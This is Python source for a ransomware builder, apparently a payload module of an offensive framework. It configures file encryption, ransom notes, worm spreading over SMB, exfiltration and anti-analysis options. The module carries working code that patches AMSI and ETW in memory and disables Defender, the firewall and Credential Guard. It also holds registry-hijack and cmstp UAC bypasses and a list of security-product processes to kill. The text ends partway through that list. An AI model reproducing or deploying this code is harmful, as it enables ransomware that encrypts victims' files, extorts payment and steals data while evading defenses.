#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Ransomware C2 Client (Hybrid + Post-Exploit)",
    "description": "Ransomware HYBRID RSA-4096 + AES-256-GCM, AV bypass/killer, BYOVD, SMB worm, anti-forensic, post-exploitation",
    "author": "POSEIDON",
    "platform": "multi",
    "rank": "Excellent",
    "types": "payload",
    "category": "payload",
    "dependencies": ["pycryptodome", "pillow"],
}

OPTIONS = {
    "LHOST": {"default": "127.0.0.1", "required": True, "description": "C2 Server IP"},
    "LPORT": {"default": 4444, "required": False, "description": "C2 Server port"},
    "ENCRYPTION": {
        "default": "hybrid",
        "required": False,
        "choices": ["hybrid", "xchacha20", "aes256", "chacha20", "xor", "rc4"],
        "description": "Encryption algorithm",
    },
    "EXTENSIONS": {
        "default": "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv,qcow2,iso,vmdk,vdi,avhd,mp3,mp4,sqlite,sqlite3",
        "required": False,
        "description": "File extensions",
    },
    "RANSOM_NOTE": {
        "default": "YOUR FILES ARE ENCRYPTED!\\nSend BTC to address...",
        "required": False,
        "description": "Ransom note",
    },
    "BTC_ADDRESS": {
        "default": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "required": False,
        "description": "Bitcoin address",
    },
    "WALLPAPER": {
        "default": True,
        "required": False,
        "description": "Change wallpaper",
    },
    "CHANGE_DESKTOP_ICONS": {
        "default": False,
        "required": False,
        "choices": ["true", "false"],
        "description": "Replace desktop icons with ransom icon",
    },
    "RANSOM_ICON_URL": {
        "default": "https://raw.githubusercontent.com/user/repo/main/ransom.png",
        "required": False,
        "description": "URL to ransom icon (PNG/ICO)",
    },
    "GUI_MODE": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Ransom GUI",
    },
    "COUNTDOWN_SECONDS": {
        "default": 300,
        "required": False,
        "description": "Countdown",
    },
    "RSA_KEY_SIZE": {
        "default": 4096,
        "required": False,
        "choices": [2048, 3072, 4096],
        "description": "RSA key size",
    },
    "AV_BYPASS": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "AV bypass",
    },
    "PRIVILEGE_ESCALATION": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Privesc",
    },
    "PARALLEL_ENCRYPTION": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Parallel",
    },
    "THREAD_COUNT": {"default": 4, "required": False, "description": "Threads"},
    "TARGET_OS": {
        "default": "all",
        "required": False,
        "choices": ["all", "windows", "linux", "macos"],
        "description": "Target OS",
    },
    "ANTI_VM": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Anti-VM",
    },
    "ANTI_DEBUG": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Anti-debug",
    },
    "ANTI_FORENSIC": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Anti-forensic",
    },
    "ANTI_DUMP": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Anti-dump",
    },
    "ANTI_RECOVERY": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Anti-recovery",
    },
    "ANTI_TIMING": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Anti-timing",
    },
    "ANTI_SANDBOX_USER": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "SB user",
    },
    "ANTI_SANDBOX_DISK": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "SB disk",
    },
    "ANTI_SANDBOX_RAM": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "SB RAM",
    },
    "ANTI_SANDBOX_CPU": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "SB CPU",
    },
    "ANTI_SANDBOX_UPTIME": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "SB uptime",
    },
    "ANTI_NETWORK": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Anti-net",
    },
    "SELF_DELETE": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Self-delete",
    },
    "POLYMORPHIC": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Polymorphic",
    },
    "ENCRYPT_HEADER": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Header",
    },
    "TRIPLE_PASS": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Triple-pass",
    },
    "BYOVD_ENABLED": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "BYOVD",
    },
    "BYOVD_DRIVER": {
        "default": "gdrv",
        "required": False,
        "choices": [
            "gdrv",
            "rtcore64",
            "winio",
            "dbgv",
            "cpuz",
            "aswark",
            "kprocesshacker",
        ],
        "description": "Driver",
    },
    "BYOVD_AUTO_KILL_AV": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Kill AV",
    },
    "BYOVD_DISABLE_ETW": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "ETW",
    },
    "BYOVD_DISABLE_DEFENDER": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Defender",
    },
    "SMB_SPREAD": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "SMB",
    },
    "SMB_METHODS": {
        "default": "smb,wmi,psexec,admin_share,remote_schtasks,scmr",
        "required": False,
        "description": "Methods",
    },
    "SMB_MAX_HOSTS": {"default": 50, "required": False, "description": "Max hosts"},
    "SMB_SCAN_SUBNETS": {
        "default": "auto",
        "required": False,
        "description": "Subnets",
    },
    "SMB_TIMEOUT": {"default": 5, "required": False, "description": "Timeout"},
    "SMB_CREDENTIALS": {"default": "", "required": False, "description": "Creds"},
    "SMB_PAYLOAD_NAME": {
        "default": "svchost.exe",
        "required": False,
        "description": "Name",
    },
    "SMB_PERSIST": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Persist",
    },
    "SMB_SELF_EXEC": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Self-exec",
    },
    "POST_EXPLOIT_ENABLED": {
        "default": True,
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable post-exploitation before encryption",
    },
    "POST_EXPLOIT_ACTIONS": {
        "default": "creds,discovery,exfil",
        "required": False,
        "description": "Comma-separated: creds,discovery,exfil",
    },
    "POST_EXPLOIT_MAX_EXFIL_MB": {
        "default": 2000,
        "required": False,
        "description": "Max exfil size (MB)",
    },
    "POST_EXPLOIT_EXFIL_METHOD": {
        "default": "c2",
        "required": False,
        "choices": ["c2", "http", "ftp", "sftp", "mega", "s3"],
        "description": "Exfil method",
    },
    "POST_EXPLOIT_EXFIL_CATEGORIES": {
        "default": "all",
        "required": False,
        "description": "all|financial|customer|source|legal|hr|email|credential|database",
    },
}

import os
import sys
import base64
import random
import string
import tempfile
import uuid
import hashlib
import shutil
import subprocess
import datetime
from pathlib import Path


class RansomwareBuilder:
    """Ransomware Builder HYBRID ENCRYPTION + POST-EXPLOITATION"""

    # ═══════════════════════════════════════════════════════════════
    # KEYPAIR MANAGEMENT
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def generate_rsa_keypair(key_size=4096):
        try:
            from Crypto.PublicKey import RSA
        except ImportError:
            raise ImportError("pycryptodome required: pip install pycryptodome")
        key = RSA.generate(key_size)
        private_pem = key.export_key().decode()
        public_pem = key.publickey().export_key().decode()
        return private_pem, public_pem

    @staticmethod
    def save_private_key(private_pem, output_dir=None, name="ransom_private_key"):
        if output_dir is None:
            output_dir = str(Path.home() / "lazyframework_keys")
        os.makedirs(output_dir, exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(output_dir, f"{name}_{ts}.pem")
        with open(path, "w") as f:
            f.write(private_pem)
        try:
            os.chmod(path, 0o600)
        except Exception:
            pass
        return path

    @staticmethod
    def load_key_from_file(path):
        with open(path, "r") as f:
            return f.read()

    @staticmethod
    def _generate_victim_id():
        return str(uuid.uuid4())[:16]

    @staticmethod
    def _key_fingerprint(public_pem):
        pub_lines = [l for l in public_pem.split("\n") if not l.startswith("-----")]
        return hashlib.sha256("".join(pub_lines).encode()).hexdigest()[:16]

    @staticmethod
    def _generate_polymorphic_helpers():
        def rand_name(prefix="v"):
            return f"{prefix}_" + "".join(random.choices(string.ascii_lowercase, k=8))

        return {
            "check_vm_fn": rand_name("chk_vm"),
            "check_debug_fn": rand_name("chk_dbg"),
            "wipe_logs_fn": rand_name("wp_log"),
            "anti_recovery_fn": rand_name("ar_rcv"),
            "self_delete_fn": rand_name("sf_del"),
            "delay_fn": rand_name("dly"),
            "obf_str_fn": rand_name("obs"),
            "sysinfo_fn": rand_name("si"),
            "timer_fn": rand_name("tm"),
            "exit_fn": rand_name("ext"),
            "byovd_install_fn": rand_name("bv_inst"),
            "byovd_open_fn": rand_name("bv_open"),
            "byovd_steal_fn": rand_name("bv_steal"),
            "byovd_cleanup_fn": rand_name("bv_cln"),
            "byovd_killav_fn": rand_name("bv_kav"),
            "byovd_etw_fn": rand_name("bv_etw"),
            "byovd_writephys_fn": rand_name("bv_wp"),
            "byovd_readphys_fn": rand_name("bv_rp"),
        }

    @staticmethod
    def _get_driver_path(driver_name):
        filenames = {
            "gdrv": ["gdrv.sys"],
            "rtcore64": ["RTCore64.sys", "rtcore64.sys"],
            "winio": ["WinIO64.sys", "winio64.sys"],
            "dbgv": ["DBUtil_2_3.sys", "dbgv.sys"],
            "cpuz": ["cpuz141_x64.sys", "cpuz.sys"],
            "aswark": ["AsUpIO64.sys", "aswark.sys"],
            "kprocesshacker": ["kprocesshacker.sys"],
        }
        search = []
        for fn in filenames.get(driver_name, [f"{driver_name}.sys"]):
            search.extend(
                [
                    os.path.join(os.path.dirname(__file__), "drivers", fn),
                    os.path.join(os.getcwd(), "drivers", fn),
                    str(Path.home() / ".lazyframework" / "byovd_drivers" / fn),
                ]
            )
        for p in search:
            if p and os.path.exists(p):
                return p
        return None

    @staticmethod
    def _embed_driver_b64(driver_name):
        p = RansomwareBuilder._get_driver_path(driver_name)
        if not p:
            return ""
        try:
            with open(p, "rb") as f:
                data = f.read()
            if len(data) < 1024:
                return ""
            b64 = base64.b64encode(data).decode()
            print(f"[+] Embedded driver: {os.path.basename(p)} ({len(data):,} bytes)")
            return b64
        except Exception as e:
            print(f"[!] Driver embed error: {e}")
            return ""

    # ═══════════════════════════════════════════════════════════════
    # POST-EXPLOITATION MODULE READER
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _read_post_exploit_module():
        candidates = [
            os.path.join(
                os.path.dirname(os.path.abspath(__file__)), "post_exploitation.py"
            ),
            os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                "post",
                "post_exploitation.py",
            ),
        ]

        post_file = None
        for c in candidates:
            if os.path.exists(c):
                post_file = c
                break

        if not post_file:
            print("[!] post_exploitation.py not found - post-exploit disabled")
            return (
                "# Post-exploitation module not found\nPOST_EXPLOIT_ENABLED = False\n"
            )

        try:
            with open(post_file, "r", encoding="utf-8") as f:
                content = f.read()

            import re

            match = re.search(r"(def _detect_os\(\):)", content)
            if match:
                content = (
                    "# ===================================================================\n"
                    "# POST-EXPLOITATION MODULE (embedded)\n"
                    "# ===================================================================\n"
                    + content[match.start() :]
                )

            print(f"[+] Embedded post-exploitation module: {len(content):,} chars")
            return content

        except Exception as e:
            print(f"[!] Failed to read post_exploitation.py: {e}")
            return "# Post-exploitation module error\nPOST_EXPLOIT_ENABLED = False\n"

    # ═══════════════════════════════════════════════════════════════
    # DESKTOP ICONS
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _desktop_icons_embedded_code():
        import zlib
        import base64 as _b64_local

        current_file = os.path.abspath(__file__)
        current_dir = os.path.dirname(current_file)
        icons_file = os.path.join(current_dir, "desktop_icons.py")

        if not os.path.exists(icons_file):
            return (
                "\n"
                "def change_desktop_icons(*args, **kwargs):\n"
                "    return {'success': False, 'error': 'desktop_icons module not found'}\n"
                "\n"
                "def restore_desktop_icons(*args, **kwargs):\n"
                "    return {'success': False, 'error': 'desktop_icons module not found'}\n"
                "\n"
                "def is_backup_exists():\n"
                "    return False\n"
            )

        with open(icons_file, "r", encoding="utf-8") as f:
            icons_code = f.read()

        compressed = zlib.compress(icons_code.encode("utf-8"), level=9)
        b64 = _b64_local.b64encode(compressed).decode("ascii")
        chunks = [b64[i : i + 80] for i in range(0, len(b64), 80)]

        parts = []
        parts.append("# --- Embedded desktop_icons.py (compressed) ---")
        parts.append("_ICONS_B64 = (")
        for c in chunks:
            parts.append('    "' + c + '"')
        parts.append(")")
        parts.append("")
        parts.append("def _load_desktop_icons():")
        parts.append("    import zlib as _z")
        parts.append("    import base64 as _b")
        parts.append("    try:")
        parts.append("        _raw = ''.join(_ICONS_B64)")
        parts.append(
            "        _code = _z.decompress(_b.b64decode(_raw)).decode('utf-8')"
        )
        parts.append("        _ns = {'__name__': '_embedded_icons'}")
        parts.append("        exec(_code, _ns)")
        parts.append("        return _ns")
        parts.append("    except Exception as _e:")
        parts.append("        print('[!] Failed to load desktop_icons: ' + str(_e))")
        parts.append("        return None")
        parts.append("")
        parts.append("_ICONS_MODULE = _load_desktop_icons()")
        parts.append("")
        parts.append("def change_desktop_icons(*args, **kwargs):")
        parts.append(
            "    if _ICONS_MODULE and 'change_desktop_icons' in _ICONS_MODULE:"
        )
        parts.append(
            "        return _ICONS_MODULE['change_desktop_icons'](*args, **kwargs)"
        )
        parts.append("    return {'success': False, 'error': 'module not loaded'}")
        parts.append("")
        parts.append("def restore_desktop_icons(*args, **kwargs):")
        parts.append(
            "    if _ICONS_MODULE and 'restore_desktop_icons' in _ICONS_MODULE:"
        )
        parts.append(
            "        return _ICONS_MODULE['restore_desktop_icons'](*args, **kwargs)"
        )
        parts.append("    return {'success': False, 'error': 'module not loaded'}")
        parts.append("")
        parts.append("def is_backup_exists():")
        parts.append("    if _ICONS_MODULE and 'is_backup_exists' in _ICONS_MODULE:")
        parts.append("        return _ICONS_MODULE['is_backup_exists']()")
        parts.append("    return False")
        parts.append("")

        return "\n".join(parts)

    # ═══════════════════════════════════════════════════════════════
    # AV BYPASS BLOCK (Windows-only)
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _make_av_bypass_block(av_bypass, names):
        av = av_bypass
        return f"""
# ==================== AV/EDR BYPASS ENGINE (Windows) ====================
AV_BYPASS_ENABLED = {str(av)}


def _av_amsi_patch_scan_buffer():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        import ctypes
        from ctypes import wintypes
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if not amsi:
            return False
        addr = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
        if not addr:
            return False
        patch = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
        old = wintypes.DWORD(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), old.value, ctypes.byref(old))
        return True
    except Exception:
        return False


def _av_amsi_patch_scan_string():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        import ctypes
        from ctypes import wintypes
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanString")
        if not addr:
            return False
        patch = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])
        old = wintypes.DWORD(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), old.value, ctypes.byref(old))
        return True
    except Exception:
        return False


def _av_amsi_patch_open_session():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        import ctypes
        from ctypes import wintypes
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiOpenSession")
        if not addr:
            return False
        patch = bytes([0x31, 0xC0, 0xC3])
        old = wintypes.DWORD(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), old.value, ctypes.byref(old))
        return True
    except Exception:
        return False


def _av_amsi_reflection():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        ps = ('[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")'
              '.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)')
        subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
            capture_output=True, timeout=15, creationflags=0x08000000)
        return True
    except Exception:
        return False


def _av_amsi_disable_force():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        subprocess.run(
            ["reg", "add",
             r"HKCU\\Software\\Microsoft\\Windows Script\\Settings",
             "/v", "AmsiEnable", "/t", "REG_DWORD", "/d", "0", "/f"],
            capture_output=True, timeout=10, creationflags=0x08000000)
        return True
    except Exception:
        return False


def _run_amsi_bypass():
    if not AV_BYPASS_ENABLED:
        return False
    print("[*] AV: AMSI bypass...")
    for name, fn in [
        ("AmsiScanBuffer", _av_amsi_patch_scan_buffer),
        ("AmsiScanString", _av_amsi_patch_scan_string),
        ("AmsiOpenSession", _av_amsi_patch_open_session),
        ("PowerShell reflection", _av_amsi_reflection),
        ("Registry disable", _av_amsi_disable_force),
    ]:
        try:
            if fn():
                print("[+] AV: AMSI bypassed via " + name)
                return True
        except Exception:
            continue
    print("[!] AV: AMSI bypass failed")
    return False


def _av_etw_patch(fn_name):
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        import ctypes
        from ctypes import wintypes
        ntdll = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(ntdll, fn_name)
        if not addr:
            return False
        patch = bytes([0x33, 0xC0, 0xC3])
        old = wintypes.DWORD(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), 0x40, ctypes.byref(old))
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch), old.value, ctypes.byref(old))
        return True
    except Exception:
        return False


def _run_etw_bypass():
    if not AV_BYPASS_ENABLED:
        return False
    print("[*] AV: ETW bypass...")
    count = 0
    for fn_name in [b"EtwEventWrite", b"EtwEventWriteFull", b"NtTraceEvent"]:
        try:
            if _av_etw_patch(fn_name):
                count += 1
        except Exception:
            continue
    if count > 0:
        print("[+] AV: ETW patched (" + str(count) + " functions)")
    return count > 0


def _run_defender_disable():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    print("[*] AV: Disabling Defender...")
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command",
             "Set-MpPreference -DisableRealtimeMonitoring $true "
             "-DisableBehaviorMonitoring $true -DisableIOAVProtection $true "
             "-DisableScriptScanning $true -DisableArchiveScanning $true "
             "-DisableIntrusionPreventionSystem $true "
             "-MAPSReporting Disabled -SubmitSamplesConsent NeverSend "
             "-ErrorAction SilentlyContinue"],
            capture_output=True, timeout=30, creationflags=0x08000000)
        return True
    except Exception:
        return False


# ==================== UAC BYPASS (ADMIN-LEVEL) ====================

def _uac_check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _uac_is_in_admin_group():
    try:
        import subprocess as _sp
        r = _sp.run(
            ["net", "localgroup", "Administrators"],
            capture_output=True, text=True, timeout=10,
            creationflags=0x08000000,
        )
        if r.returncode != 0:
            return False
        user = os.environ.get("USERNAME", "").lower()
        computer = os.environ.get("COMPUTERNAME", "").lower()
        out_lower = r.stdout.lower()
        if user and (user in out_lower or (computer + "\\\\" + user) in out_lower):
            return True
        r2 = _sp.run(
            ["whoami"],
            capture_output=True, text=True, timeout=5,
            creationflags=0x08000000,
        )
        who = r2.stdout.strip().lower()
        if who and who in out_lower:
            return True
        return False
    except Exception:
        return False


def _uac_get_payload_cmd():
    try:
        if getattr(sys, "frozen", False):
            return '"' + sys.executable + '"'
        else:
            script = os.path.abspath(sys.argv[0])
            args = " ".join('"' + a + '"' for a in sys.argv[1:])
            cmd = '"' + sys.executable + '" "' + script + '"'
            if args:
                cmd += " " + args
            return cmd
    except Exception:
        return sys.executable


def _uac_cleanup_registry():
    try:
        import winreg
        keys_to_delete = [
            r"Software\\Classes\\ms-settings\\Shell\\Open\\command",
            r"Software\\Classes\\ms-settings\\Shell\\Open",
            r"Software\\Classes\\ms-settings\\Shell",
            r"Software\\Classes\\ms-settings",
        ]
        for kp in keys_to_delete:
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, kp)
            except FileNotFoundError:
                pass
            except OSError:
                pass
        return True
    except Exception:
        return False


def _uac_bypass_fodhelper(payload_cmd=None):
    if payload_cmd is None:
        payload_cmd = _uac_get_payload_cmd()
    try:
        import winreg
        kp = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, kp, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, payload_cmd)
        winreg.CloseKey(k)
        print("[*] UAC: Hijacked ms-settings registry")
        proc = subprocess.Popen(
            ["fodhelper.exe"],
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(3)
        _uac_cleanup_registry()
        try:
            proc.wait(timeout=2)
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass
        return True
    except Exception as e:
        print("[!] UAC fodhelper error: " + str(e))
        _uac_cleanup_registry()
        return False


def _uac_bypass_computerdefaults(payload_cmd=None):
    if payload_cmd is None:
        payload_cmd = _uac_get_payload_cmd()
    try:
        import winreg
        kp = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, kp, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, payload_cmd)
        winreg.CloseKey(k)
        print("[*] UAC: Hijacked ms-settings (computerdefaults)")
        proc = subprocess.Popen(
            ["computerdefaults.exe"],
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(3)
        _uac_cleanup_registry()
        try:
            proc.wait(timeout=2)
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass
        return True
    except Exception as e:
        print("[!] UAC computerdefaults error: " + str(e))
        _uac_cleanup_registry()
        return False


def _uac_bypass_cmstp(payload_cmd=None):
    if payload_cmd is None:
        payload_cmd = _uac_get_payload_cmd()
    inf_path = None
    try:
        inf_path = os.path.join(
            tempfile.gettempdir(),
            "uac_" + str(random.randint(100000, 999999)) + ".inf",
        )
        inf_content = (
            "[version]\\n"
            'Signature="$chicago$"\\n'
            "AdvancedINF=2.5\\n"
            "\\n"
            "[DefaultInstall]\\n"
            "CustomDestination=CustInstDestSectionAllUsers\\n"
            "RunPreSetupCommands=RunPreSetupCommandsSection\\n"
            "\\n"
            "[RunPreSetupCommandsSection]\\n"
            + payload_cmd + "\\n"
            "taskkill /IM cmstp.exe /F\\n"
            "\\n"
            "[CustInstDestSectionAllUsers]\\n"
            "49000,49001=AllUSer_LDIDSection, 7\\n"
            "\\n"
            "[AllUSer_LDIDSection]\\n"
            '"HKLM", "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\CMMGR32.EXE", '
            '"ProfileInstallPath", "%UnexpectedError%", ""\\n'
            "\\n"
            "[Strings]\\n"
            "ServiceName=UACBypass\\n"
            "ShortSvcName=UACBypass\\n"
        )
        with open(inf_path, "w", encoding="utf-8") as f:
            f.write(inf_content)
        print("[*] UAC: Created INF = " + inf_path)
        proc = subprocess.Popen(
            ["cmstp.exe", "/au", inf_path],
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(3)
        try:
            proc.terminate()
        except Exception:
            pass
        return True
    except Exception as e:
        print("[!] UAC cmstp error: " + str(e))
        return False
    finally:
        if inf_path and os.path.exists(inf_path):
            try:
                os.remove(inf_path)
            except Exception:
                pass


def _run_uac_bypass():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    if _uac_check_admin():
        print("[+] UAC: Already elevated - skipping bypass")
        return True
    print("[*] UAC: Checking if user is in Administrators group...")
    if not _uac_is_in_admin_group():
        print("[!] UAC: User NOT in Administrators group")
        print("[!] UAC: Bypass will not work - need true privilege escalation")
        return False
    print("[+] UAC: User IS admin (medium integrity)")
    payload_cmd = _uac_get_payload_cmd()
    print("[*] UAC: Payload command = " + payload_cmd)
    methods = [
        ("cmstp", _uac_bypass_cmstp),
        ("fodhelper", _uac_bypass_fodhelper),
        ("computerdefaults", _uac_bypass_computerdefaults),
    ]
    for name, fn in methods:
        print("[*] UAC: Trying " + name + "...")
        try:
            if fn(payload_cmd):
                print("[+] UAC: Bypass triggered via " + name)
                return True
        except Exception as e:
            print("[!] UAC: " + name + " exception: " + str(e))
            continue
    print("[!] UAC: All methods failed")
    print("[!] UAC: Target may be patched (Win11 23H2+) or UAC = 'Always notify'")
    return False


def _av_disable_firewall():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        subprocess.run(
            ["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
            capture_output=True, timeout=15, creationflags=0x08000000)
        return True
    except Exception:
        return False


def _av_disable_credential_guard():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return False
    try:
        subprocess.run(
            ["reg", "add", r"HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA",
             "/v", "LsaCfgFlags", "/t", "REG_DWORD", "/d", "0", "/f"],
            capture_output=True, timeout=10, creationflags=0x08000000)
        subprocess.run(
            ["reg", "add", r"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
             "/v", "RunAsPPL", "/t", "REG_DWORD", "/d", "0", "/f"],
            capture_output=True, timeout=10, creationflags=0x08000000)
        return True
    except Exception:
        return False


def _av_anti_vm_check():
    if not AV_BYPASS_ENABLED:
        return False
    indicators = 0
    try:
        import uuid
        mac = uuid.getnode()
        ms = ":".join([format((mac >> e) & 0xFF, "02X") for e in range(40, -8, -8)][:6])
        for prefix in ["00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00"]:
            if ms.upper().startswith(prefix):
                indicators += 1
                break
    except Exception:
        pass
    try:
        hn = socket.gethostname().lower()
        for p in ["sandbox", "malware", "test", "vm", "analysis"]:
            if p in hn:
                indicators += 1
                break
    except Exception:
        pass
    return indicators >= 1


def _run_av_bypass():
    if not AV_BYPASS_ENABLED or not IS_WINDOWS:
        return
    print("=" * 60)
    print("AV/EDR BYPASS ENGINE")
    print("=" * 60)
    if _av_anti_vm_check():
        print("[!] AV: VM detected -- aborting")
        try:
            sys.exit(0)
        except Exception:
            os._exit(0)
    try:
        _run_amsi_bypass()
    except Exception as e:
        print("[!] AMSI error: " + str(e))
    try:
        _run_etw_bypass()
    except Exception as e:
        print("[!] ETW error: " + str(e))
    try:
        _run_uac_bypass()
    except Exception as e:
        print("[!] UAC error: " + str(e))
    try:
        _run_defender_disable()
    except Exception as e:
        print("[!] Defender error: " + str(e))
    try:
        if _av_disable_firewall():
            print("[+] AV: Firewall disabled")
    except Exception:
        pass
    try:
        if _av_disable_credential_guard():
            print("[+] AV: Credential Guard disabled")
    except Exception:
        pass
    print("=" * 60)


# ==================== END AV BYPASS ====================

"""

    # ═══════════════════════════════════════════════════════════════
    # AV KILLER BLOCK (Windows-only)
    # ═══════════════════════════════════════════════════════════════

    @staticmethod
    def _make_av_killer_block(names):
        return """
# ==================== AV/EDR KILLER (Windows) ====================
AV_KILLER_ENABLED = True

AV_PROCESSES = [
    "MsMpEng.exe", "MsSense.exe", "NisSrv.exe", "SecurityHealthService.exe",
    "SecurityHealthSystray.exe", "MpCmdRun.exe", "MpUXSrv.exe",
    "MSASCui.exe", "MSASCuiL.exe", "smartscreen.exe",
    "SenseCncProxy.exe", "SenseIR.exe", "SenseSC.exe", "SenseNdr.exe",
    "CSFalconService.exe", "CSFalconContainer.exe", "CSFalconUI.exe",
    "CSAgent.exe", "CSBootstrapper.exe",
    "SentinelAgent.exe", "SentinelServiceHost.exe", "SentinelStaticEngine.exe",
    "SentinelHelperService.exe", "SentinelUI.exe", "SentinelScanService.exe",
    "cb.exe", "RepMgr.exe", "RepUtils.exe", "RepUx.exe", "CbDefense.exe",
    "CbOsSensor.exe", "CbStreamingService.exe", "CbSensorApi.exe",
    "CylanceSvc.exe", "CylanceUI.exe", "CylanceProtect.exe", "CyUpdate.exe",
    "ekrn.exe", "egui.exe", "ecls.exe", "ecmd.exe", "EraAgentSvc.exe",
    "avp.exe", "avpui.exe", "kavfs.exe", "kavfsslp.exe", "klnagent.exe",
    "ksde.exe", "ksdeui.exe",
